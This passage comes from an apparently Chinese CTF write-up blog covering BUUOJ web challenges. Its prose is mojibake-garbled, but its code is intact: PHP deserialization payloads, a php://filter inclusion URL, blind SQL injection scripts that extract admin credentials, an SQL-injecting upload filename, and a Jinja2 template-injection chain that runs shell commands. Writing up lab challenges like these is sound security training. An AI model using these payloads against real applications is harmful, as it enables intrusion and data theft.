<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure>

<p>æ˜¯ä¸€é“ç®€å•çš„phpååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$c = <span class="keyword">new</span> HelloPhp; </span><br><span class="line">$c-&gt;a=<span class="string">'phpinfo()'</span>;</span><br><span class="line">$c-&gt;b=<span class="string">'assert'</span>;<span class="comment">//assertæ˜¯å°è¯•äº†åˆ«çš„æ‰§è¡Œå‡½æ•°åå‘ç°çš„</span></span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line"><span class="comment">//O:8:"HelloPhp":2:&#123;s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";&#125;</span></span><br></pre></td></tr></table></figure>

<p>æŠŠåºåˆ—åŒ–æ•°æ®ä¼ ç»™dataï¼Œåœ¨phpinfoé¡µé¢æ‰¾åˆ°flagï¼Œæˆ–è€…ç½‘é¡µæºç å¤„ä¹Ÿå¯ä»¥</p>
<img src="/2020/05/16/buuoj3/11.png" class="">

<h4 id="0X08ï¼š-BSidesCF-2020-Had-a-bad-day"><a href="#0X08ï¼š-BSidesCF-2020-Had-a-bad-day" class="headerlink" title="0X08ï¼š[BSidesCF 2020]Had a bad day"></a>0X08ï¼š[BSidesCF 2020]Had a bad day</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œæœ‰æŒ‰é’®ï¼Œéšä¾¿ç‚¹ä¸€ä¸ªurlå‡ºæ¥çš„å½¢å¼åº”è¯¥æ˜¯sqlæˆ–è€…æ–‡ä»¶åŒ…å«ï¼Œå°è¯•åŒ…å«index.php</p>
<img src="/2020/05/16/buuoj3/12.png" class="">

<p>å‡ºé”™äº†ï¼Œå»æ‰äº†.phpåç¼€æˆåŠŸåŒ…å«ï¼Œbase64è§£ç ï¼Œè´´ä¸€ä¸‹ä¸»è¦çš„phpéƒ¨åˆ†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'category'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>( strpos( $file, <span class="string">"woofers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"meowers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"index"</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> ($file . <span class="string">'.php'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Sorry, we currently only support woofers and meowers."</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯è§è¦æƒ³åŒ…å«æˆåŠŸ,categoryå‚æ•°å€¼ä¸­è¦æœ‰woofersï¼Œmeowersæˆ–è€…indexï¼Œåªéœ€è¦ç”¨ä¼ªåè®®å¥—ä¸€å±‚åè®®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;40a3219f-a796-4a79-9c4f-0dcd86f4e96a.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure>

<img src="/2020/05/16/buuoj3/13.png" class="">

<p>base64è§£ç å°±èƒ½å¤Ÿçœ‹åˆ°flagäº†</p>
<h4 id="0X09ï¼š-WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#0X09ï¼š-WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="0X09ï¼š[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>0X09ï¼š[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h4><p>ç›²æ³¨ï¼Œç›´æ¥ä¸Šè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://7e100a65-2a28-4468-bd32-37a4f7d7bf17.node3.buuoj.cn/?stunum=1"</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    mid = left + ((right - left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        <span class="comment"># payload = "^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)".format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload = "^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='ctf'),&#123;&#125;,1))&gt;&#123;&#125;)".format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload = "^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),&#123;&#125;,1))&gt;&#123;&#125;)".format(i,mid)</span></span><br><span class="line">        payload = <span class="string">"^(ascii(substr((select(value)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)"</span>.format(i,mid)</span><br><span class="line">        r = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">            print(<span class="string">'too fast'</span>)</span><br><span class="line">            time.sleep(<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hi admin, your score is: 100'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'Hi admin, your score is: 100'</span>  <span class="keyword">in</span> r.text:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = left + ((right-left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += chr(mid)</span><br><span class="line">    print(str(mid),res)</span><br></pre></td></tr></table></figure>

<p>ä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œæ¯æ¬¡å‡ºæ¥çš„flagéƒ½ä¸ä¸€æ ·ï¼Œå…ˆæ”¾ç€äº†ï¼Œæ€è·¯æ²¡é—®é¢˜ï¼Œç”¨å¼‚æˆ–æ³¨å…¥</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj5</title>
    <url>/2020/06/04/buuoj5/</url>
    <content><![CDATA[<p>23333ï¼Œç»§ç»­<a id="more"></a></p>
<h3 id="å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "><a href="#å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "></a>[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </h3><p>æ–‡ä»¶ä¸Šä¼ ï¼Œè¯•éäº†å¸¸è§„æ–¹æ³•ï¼Œæ²¡æœ‰è¿›å±•ï¼Œå‘ç°å¥½åƒç»™äº†æç¤º</p>
<img src="/2020/06/04/buuoj5/2.png" class="">

<p>GitHubæœä¸€ä¸‹ï¼Œæ‹¿åˆ°äº†æºç ï¼Œçœ‹ä¸€ä¸‹ä¸‰ä¸ªæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">		$array = <span class="keyword">array</span>();</span><br><span class="line">		$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">		$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">		$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">		$array[<span class="string">"path"</span>] = $fileinfo[<span class="string">'path'</span>];</span><br><span class="line">		$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">		$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">		$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">		$id = <span class="keyword">$this</span>-&gt;save($array);</span><br><span class="line">		<span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯¹ä¼ å…¥çš„attrå‚æ•°å€¼è¿›è¡Œäº†åºåˆ—åŒ–å¤„ç†ï¼Œçœ‹ä¸€ä¸‹checkå‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$basename = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">	$filename = $info[<span class="string">"name"</span>];</span><br><span class="line">	$ext = substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>);<span class="comment">//è¿”å›åç¼€å</span></span><br><span class="line">	$cate_exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!in_array($ext,$cate_exts))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    $title = str_replace(<span class="string">"."</span>.$ext,<span class="string">''</span>,$filename);<span class="comment">//åŒ¹é…ä¸Šä¼ æ–‡ä»¶åï¼Œå°†åç¼€æ›¿æ¢ä¸ºç©º</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$title,<span class="string">'filename'</span>=&gt;$basename.<span class="string">"."</span>.$ext,<span class="string">'ext'</span>=&gt;$ext,<span class="string">'path'</span>=&gt;<span class="keyword">$this</span>-&gt;folder.$basename.<span class="string">"."</span>.$ext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥å‘ç°å¯æ§çš„åªæœ‰filenameï¼Œtitleçš„å€¼æ˜¯filenameå»æ‰åç¼€åå‰©ä¸‹çš„ä¸œè¥¿ï¼Œå¯ä»¥æ³¨æ„åˆ°ä¼ å…¥äº”ä¸ªå‚æ•°ï¼Œè¿™é‡Œç›´æ¥å…¨éƒ¨èµ‹ç»™titleï¼Œåé¢æ³¨é‡Šç¬¦éš”æ–­å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">		    		$attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">					$attr = unserialize($attr_temp);<span class="comment">//ååºåˆ—åŒ–æ•°æ®</span></span><br></pre></td></tr></table></figure>

<p>åœ¨show.phpä¸­ååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment"># Read some config html</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„åˆ°ææ„é­”æœ¯æ–¹æ³•ï¼Œé€šè¿‡è°ƒç”¨view_fileså‡½æ•°ä¸­çš„file_get_contentså¯ä»¥è¯»å–åˆ°flagæ–‡ä»¶ï¼Œä¸‹é¢æ„ä¸€ä¸‹poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ifview = <span class="keyword">True</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = <span class="string">"/flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:6:"helper":2:&#123;s:9:" \0\0\0ifview";b:1;s:9:" \0\0\0config";s:5:"/flag";&#125;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸ºä»€ä¹ˆè¦å†™æˆ\0\0\0ï¼Œå› ä¸ºæºç ä¸­å¯¹æ•°æ®è¿›è¡Œäº†å¤„ç†ï¼Œ\0\0\0è¢«æ›¿æ¢å›*</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename&#x3D;&quot;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg&quot;</span><br></pre></td></tr></table></figure>

<img src="/2020/06/04/buuoj5/3.png" class="">

<h3 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h3><p>æ²¡å•¥è„‘æ´ä¹‹ç±»çš„ï¼Œç¡¬ç®—1000æ¬¡å°±ç»™flagï¼Œç›´æ¥ä¸Šè„šæœ¬ï¼Œè¿™é‡Œè¦æ³¨æ„æäº¤ä¸è¦å¤ªå¿«ï¼Œæ¯æ¬¡æäº¤ä¹‹é—´æœ€å¥½é—´éš”0.5ç§’ï¼Œä¸ç„¶ç”¨å„ç§æ­£åˆ™åŒ¹é…çš„å‡½æ•°éƒ½ä¼šæŠ¥é”™</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = session()</span><br><span class="line">a = s.get(<span class="string">"http://9a335e7b-3ea9-4dc2-a35d-6bddcf68e13d.node3.buuoj.cn/index.php"</span>)</span><br><span class="line">pattern = re.findall(<span class="string">r'\d+.[+-].\d+'</span>, a.text)</span><br><span class="line">c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">a = s.post(<span class="string">"http://9a335e7b-3ea9-4dc2-a35d-6bddcf68e13d.node3.buuoj.cn/index.php"</span>, data = &#123;<span class="string">"answer"</span> : c&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1010</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pattern = re.findall(<span class="string">r'\d+.[+-].\d+'</span>, a.text)</span><br><span class="line">        c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">        print(c)</span><br><span class="line">        a = s.post(<span class="string">"http://9a335e7b-3ea9-4dc2-a35d-6bddcf68e13d.node3.buuoj.cn/index.php"</span>, data = &#123;<span class="string">"answer"</span> : c&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure>

<img src="/2020/06/04/buuoj5/1.png" class="">

<h3 id="Black-Watch-å…¥ç¾¤é¢˜-Web"><a href="#Black-Watch-å…¥ç¾¤é¢˜-Web" class="headerlink" title="[Black Watch å…¥ç¾¤é¢˜]Web"></a>[Black Watch å…¥ç¾¤é¢˜]Web</h3><p>å¼€é¢˜ï¼Œæœ‰ä¸€ä¸ªçƒ­ç‚¹åˆ—è¡¨ï¼Œç‚¹å‡»å¯ä»¥æŸ¥çœ‹ï¼Œç™»å½•ç•Œé¢å°è¯•sqlæ³¨å…¥ï¼Œå¤±è´¥ï¼Œå¯èƒ½æœ‰åˆ«çš„ç‚¹æ²¡æœ‰æ³¨æ„åˆ°</p>
<p>googleå¼€å‘è€…å·¥å…·ï¼Œåœ¨Networkå‘ç°äº†ä¸å¾—äº†çš„ä¸œè¥¿</p>
<img src="/2020/06/04/buuoj5/4.png" class="">

<p>æŸ¥çœ‹è¿™ä¸ªè·¯å¾„ï¼Œå‘ç°idå‚æ•°å¯æ§ï¼Œä¹Ÿå°±æ˜¯å‰é¢ä¸‰ä¸ªçƒ­ç‚¹å†…å®¹çš„ä¿¡æ¯ï¼Œå‰é¢çš„é“¾æ¥è·³è½¬éšè—äº†è·¯å¾„ï¼Œæ‰€ä»¥åœ¨Networkä¸­æ‰çœ‹åˆ°ï¼Œå°è¯•åŠ ä¸Šâ€ï¼Œè¿”å›{â€œwarningâ€:â€Big big hack hack~â€}ï¼Œsqlæ³¨å…¥æ— ç–‘äº†</p>
<p>æµ‹fuzzï¼Œä»€ä¹ˆéƒ½æ²¡è¿‡æ»¤ï¼Œç”¨å¼‚æˆ–æˆ–è€…if</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag1=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">        url = <span class="string">"http://615831e3-f9b2-44ca-b66f-b14b9d1ec8bf.node3.buuoj.cn/backend/content_detail.php?id="</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># payload = "(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)".format(i,mid)#admin,contents</span></span><br><span class="line">        <span class="comment">#payload = "(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),&#123;&#125;,1))&gt;&#123;&#125;)".format(i, mid)#id,username,password,is_enable</span></span><br><span class="line">        <span class="comment">#payload = "(ascii(substr((select(group_concat(password))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)".format(i, mid)#682fd392,f8f51441</span></span><br><span class="line">        payload = <span class="string">"(ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)"</span>.format(i, mid)<span class="comment">#ff04e965,1d1ae597</span></span><br><span class="line">        <span class="comment"># payload = "(ascii(substr((select(group_concat(is_enable))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)".format(i, mid)</span></span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        res = requests.get(url+payload)</span><br><span class="line">        text = str(res.json())</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"æœ­å¸ˆå‚…ç¼ºä¸ªå¥³æœ‹å‹"</span> <span class="keyword">in</span> text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    print(low,mid,high)</span><br><span class="line">    flag1 += chr(low)</span><br><span class="line">    print(flag1)</span><br></pre></td></tr></table></figure>

<h3 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h3><p>å¼€é¢˜æ²¡ä»€ä¹ˆä¿¡æ¯ï¼Œå°±å†™äº†ä¸€å¥è¯ï¼šWelcome To Find Secret</p>
<p>ä¸‹é¢æ˜¯çŒœçš„ï¼Œæ‰¾ç§˜å¯†ä¼šä¸ä¼šæœ‰è¿™ä¸ªè·¯å¾„ï¼Œå°è¯•äº†ä¸€ä¸‹ï¼ŒçœŸçš„æœ‰ï¼</p>
<img src="/2020/06/04/buuoj5/5.png" class="">

<p>å‘Šè¯‰æœåŠ¡å™¨ç§˜å¯†ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªå‚æ•°åº”è¯¥æ˜¯secretäº†ï¼Œä¼ ä¸ª1è¯•ä¸€ä¸‹~~è¿”å›äº†ä¸€ä¸ªd23333</p>
<p>å¡ä½äº†ï¼Œä¸çŸ¥é“å’‹æï¼Œæ¥ä¸ªå¤§ä¸€ç‚¹çš„æ•°è¯•è¯•ï¼Œ?secret=1000000,æŠ¥é”™äº†ï¼ï¼ï¼</p>
<img src="/2020/06/04/buuoj5/6.png" class="">

<p>RC4åŠ å¯†ï¼ŒåŠ å¯†è§£å¯†çš„å¯†é’¥å¥½åƒæ˜¯åŒä¸€ä¸ªï¼Œå¯†é’¥è¢«æ³„éœ²äº†ï¼Œè¿™é‡Œå› ä¸ºæœåŠ¡å™¨ä¼šè§£æä¸€æ¬¡urlç¼–ç ï¼Œæ‰€ä»¥RC4åŠ å¯†ä¹‹åè¦å†åŠ ä¸€æ¬¡urlåŠ å¯†ï¼Œæ‰¾æ‰¾RC4åŠ å¯†è„šæœ¬ï¼Œç„¶åè¿™ä¸ªåˆæ˜¯python2.7çš„ï¼Œæ ¹æ®ç»éªŒåº”è¯¥æ˜¯pythonæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥äº†ï¼Œæå‡ºä¹‹å‰æ”¶é›†çš„é“¾å­ç›´æ¥åŠ å¯†å°±è¡Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span><span class="params">(key = <span class="string">"init_key"</span>, message = <span class="string">"init_message"</span>)</span>:</span><span class="comment">#è¿”å›åŠ å¯†åå¾—å†…å®¹</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span><span class="params">(key)</span>:</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span><span class="params">(plain, box)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = <span class="string">""</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (str(base64.b64encode(cipher.encode(<span class="string">'utf-8'</span>)), <span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">"HereIsTreasure"</span>  <span class="comment">#æ­¤å¤„ä¸ºå¯†æ–‡</span></span><br><span class="line">message = input(<span class="string">"è¯·è¾“å…¥æ˜æ–‡:\n"</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = str(base64.b64decode(enc_base64),<span class="string">'utf-8'</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line">print(<span class="string">"rc4åŠ å¯†åçš„urlç¼–ç :"</span>+enc_url)</span><br><span class="line"><span class="comment">#print("rc4åŠ å¯†åçš„base64ç¼–ç "+enc_base64)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag.txt&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#rc4åŠ å¯†åçš„urlç¼–ç :.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5&#x2F;%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%93%08n0%C3%AE%C3%BDb%C2%B1%C3%80%C3%B6%1F%5B%C2%88B%23~%C3%A6%C2%BC%5D%C2%81%C3%BF%C3%88d%C2%AE%C2%B8%C3%8E2%C2%92%20C%C2%B7%C2%B7%C2%95%C3%95Wj%C3%93%C2%B5%C3%AA_%C2%A1%2B%C2%87%C2%B5l%08%27%3F%C3%96</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„åŠ å¯†ä¹‹åçš„æ•°æ®ç›´æ¥ä¼ ç»™secretå‚æ•°å°±å¯ä»¥äº†</p>
